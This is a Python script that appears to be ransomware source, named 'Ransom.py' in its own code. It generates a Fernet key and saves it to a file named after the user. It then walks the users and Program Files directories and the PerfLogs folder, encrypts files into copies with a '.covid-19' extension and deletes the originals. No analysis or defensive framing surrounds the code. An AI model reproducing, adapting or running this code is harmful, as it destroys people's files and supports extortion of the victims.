#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import os, sys, socket, wget, struct, ctypes, shutil, base64

password = b"28c5497c5b26f5e44d4b823738a8ad2d"
usr = os.environ["USERNAME"]

def genkey(name):
    global key
    salt = b'\x82k\x19r%j\xe6\xf6\xda\x94&h9\xfd\xba\x0c'
    kdf = PBKDF2HMAC(
	    algorithm=hashes.SHA256(),
	    length=32,
	    salt=salt,
	    iterations = 1000000,
	    backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    key = Fernet.generate_key()
    print("The key is : %s" %(key))
    file = open(usr+".key", "wb")
    file.write(key)
    file.close()

#FILE ENCYPTING FUNCTION
def file_ecrypt(key, name):
    if (name!="Ransom.py"):
        with open(name,'rb') as files:
            data = files.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        encrypted_file = name + ".covid-19"
        try:
            with open(encrypted_file, 'wb') as files:
                files.write(encrypted)

            os.remove(name)
        except:
            pass
#LIST ALL FILES EXTENTIONS AND INVOKE ENCRYPTION FUNCTION
def filelist():
    spec = ['/users/', '/Program Files (x86)/', '/Program Files/']
    for i in spec:
        for root, dirs, files in os.walk(i):
            for file in files:
                for ext in file.split("."):
                    try:
                        if file.endswith(ext):
                            ally = os.path.join(root, file)
                            print(ally)
                            file_ecrypt(key, ally)
                    except PermissionError:
                        pass
# ENCRYPT THE FOLDER CONTAINS THE WALLPAPER
def filelist_aux():
    mylist = ["jpg", "jpeg", "log"]
    spec = '/PerfLogs/'
    for root, dirs, files in os.walk(spec):
        for file in files:
            for ext in mylist:
                try:
                    if file.endswith(ext):
                        ally = os.path.join(root, file)
                        print(ally)
                        file_ecrypt(key, ally)
                except:
                    pass
